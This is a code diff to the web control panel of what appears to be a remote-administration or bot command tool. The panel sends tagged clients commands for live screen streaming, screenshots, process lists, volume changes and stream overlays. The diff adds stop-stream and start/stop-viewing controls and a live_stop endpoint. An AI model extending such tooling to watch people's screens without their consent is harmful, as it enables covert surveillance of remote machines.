@@ -449,8 +449,9 @@ PANEL_HTML = r"""<!doctype html>
               <div><div class="eyebrow">Live feed</div><h3>Receiver screen</h3></div>
               <div class="row" style="gap:6px;">
                 <input id="liveManualUrl" placeholder="http://host:8081/stream" style="min-width:220px; flex:1;"/>
-                <button class="btn small" onclick="loadManualStream()">Load</button>
-                <button class="btn primary small" onclick="startLiveAndWatch()">Start live</button>
+                <button class="btn small" onclick="loadManualStream()">View URL</button>
+                <button class="btn primary small" onclick="startLiveAndWatch()">Start stream</button>
+                <button class="btn small" onclick="stopLive()">Stop stream</button>
               </div>
             </div>
             <div class="live-wrap">
@@ -460,6 +461,8 @@ PANEL_HTML = r"""<!doctype html>
                 <div class="row" style="gap:6px;">
                   <button class="btn small" onclick="refreshLiveStatus()">Sync latest</button>
                   <button class="btn small" onclick="openLiveInNewTab()">Open in new tab</button>
+                  <button class="btn small" onclick="startViewing()">Start viewing</button>
+                  <button class="btn small" onclick="stopViewing()">Stop viewing</button>
                 </div>
               </div>
               <div class="live-frame">
@@ -508,6 +511,7 @@ PANEL_HTML = r"""<!doctype html>
     let currentTag = "{BOT_TAG}";
     let knownTags = new Set([currentTag]);
     let liveUrlByTag = {};
+    let viewingEnabled = false;
     let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
 
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
@@ -552,7 +556,7 @@ PANEL_HTML = r"""<!doctype html>
     function applyLiveUrl(url, tag){
       if(!url || !tag) return;
       liveUrlByTag[tag] = url;
-      if(tag !== currentTag) return;
+      if(tag !== currentTag || !viewingEnabled) return;
       if(el.liveFrame) el.liveFrame.src = url;
       if(el.liveStatus) el.liveStatus.textContent = 'Streaming ' + (tag || '');
       if(el.liveUrlLabel) el.liveUrlLabel.textContent = url;
@@ -561,8 +565,10 @@ PANEL_HTML = r"""<!doctype html>
 
     function openLiveInNewTab(){ const url=liveUrlByTag[currentTag]; if(url) window.open(url, '_blank'); else toast('No live URL yet for this tag'); }
     async function refreshLiveStatus(){ try{ const r = await fetch('/stream_status?tag='+encodeURIComponent(currentTag||'')); const j = await r.json(); if(j && j.url){ applyLiveUrl(j.url, currentTag); } else { toast('No live stream announced yet'); } } catch(e){ toast('Could not sync live feed'); } }
-    function loadManualStream(){ const url=(el.liveManualUrl?.value||'').trim(); if(!url){ toast('Enter a stream URL'); return; } applyLiveUrl(url, currentTag); toast('Live stream loaded'); }
-    async function startLiveAndWatch(){ const ok = await startLive(); if(ok !== false) { setTab('live'); toast('Starting live feed'); } }
+    function loadManualStream(){ const url=(el.liveManualUrl?.value||'').trim(); if(!url){ toast('Enter a stream URL'); return; } liveUrlByTag[currentTag]=url; if(viewingEnabled) applyLiveUrl(url, currentTag); toast('Live stream loaded'); }
+    function startViewing(){ viewingEnabled = true; const url = liveUrlByTag[currentTag] || (el.liveManualUrl?.value||'').trim(); if(url){ applyLiveUrl(url, currentTag); } else { toast('No stream URL for this tag'); } }
+    function stopViewing(){ viewingEnabled = false; if(el.liveFrame) el.liveFrame.src = ''; if(el.liveStatus) el.liveStatus.textContent = 'Viewing stopped'; }
+    async function startLiveAndWatch(){ const ok = await startLive(); if(ok !== false) { viewingEnabled = true; setTab('live'); toast('Starting live feed'); } }
     function extractStream(obj){
       if(!obj) return null;
       if(obj.stream_url) return obj.stream_url;
@@ -592,6 +598,7 @@ PANEL_HTML = r"""<!doctype html>
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
     async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); return true; } catch(e){ toast(e.message||'Could not start live'); return false; } }
+    async function stopLive(){ try{ await post('/cmd/live_stop'); toast('Stop live sent'); stopViewing(); } catch(e){ toast(e.message||'Could not stop live'); } }
     async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
@@ -702,6 +709,11 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
 async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
     await _send_cmd(f"{_resolve_tag(tag)} START_LIVE {monitor}")
     return JSONResponse({"ok": True, "monitor": monitor})
+
+@app.post("/cmd/live_stop")
+async def cmd_live_stop(tag: str = Query(None)):
+    await _send_cmd(f"{_resolve_tag(tag)} STOP_LIVE")
+    return JSONResponse({"ok": True})
 
 @app.post("/cmd/show_stream")
 async def cmd_show_stream(url: str = Query(..., min_length=1), tag: str = Query(None)):
